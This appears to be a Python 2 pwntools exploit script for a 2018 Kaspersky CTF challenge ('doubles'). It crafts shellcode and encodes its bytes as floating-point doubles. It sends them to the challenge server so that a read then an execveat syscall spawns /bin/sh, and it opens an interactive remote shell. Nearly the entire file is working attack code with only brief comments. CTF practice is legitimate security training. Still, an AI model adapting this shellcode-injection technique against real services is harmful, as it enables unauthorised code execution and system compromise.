#!/usr/bin/env python2
from pwn import *
import struct

r = remote('doubles.2018.ctf.kaspersky.com', 10001)

context.arch = 'amd64'

# \x30\x43 here is to make the exponent of double equal (1023 + 52)
# also, 52 is used to ensure every double equal to some integer

# adjust rsp to bss
sc1 = asm('mov sp, 0x601f') + '\xeb\x82' + '\x30\x43'


# read(0, rsp, 0x42) => (rax == 0x42) => xor ah, 0x01 => (rax == 0x142) => execveat(0, rsp, NULL, NULL, 0)
sc2 = asm('''
    shl rsp, 8
    jmp A
    nop
    nop
    A:
    push 0x42
    pop rdx
    nop
    jmp B
    nop
    nop
    B:
    mov rsi, rsp
    nop
    jmp C
    nop
    nop
    C:
    syscall
    xor edx, edx
    jmp D
    nop
    nop
    D:
    xor ah, 0x01
    syscall
    pop rax
    nop
    nop
''')

print repr(sc1)
print disasm(sc1)
print repr(sc2)
print disasm(sc2)

sc2 = sc2.replace('\x90\x90','\x30\x43')

total = 0.0
d = 0.0
ans = []

for i in range(len(sc2)/8):
    d = struct.unpack('d', sc2[i*8:(i+1)*8])[0]
    ans.append(format(d, '.5f'))
    total += d

# calc 6th double to adjust mean to sc1
d = struct.unpack('d', sc1)[0]
ans.append(format(d*6 - total, '.5f'))

r.sendlineafter('n: ', '6')
for s in ans:
    r.sendline(s)

r.send('/bin/sh'.ljust(0x42, '\x00'))
r.interactive()
